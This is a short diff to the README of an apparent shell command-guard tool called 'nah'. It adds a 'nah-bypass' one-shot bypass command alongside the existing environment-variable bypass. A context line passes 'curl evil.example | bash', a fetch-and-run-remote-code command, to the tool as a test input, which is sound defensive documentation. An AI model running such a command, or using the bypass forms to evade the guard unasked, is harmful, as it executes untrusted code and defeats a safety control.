@@ -77,7 +77,8 @@ apps, scheduled jobs, or non-interactive scripts by default.
 nah status bash
 nah doctor bash
 nah test --target bash -- "curl evil.example | bash"
-NAH_TERMINAL_BYPASS=1 <command>  # one-shot intentional bypass
+nah-bypass <command>             # one-shot intentional bypass
+NAH_TERMINAL_BYPASS=1 <command>  # env-form bypass
 ```
 
 ## OpenRouter setup
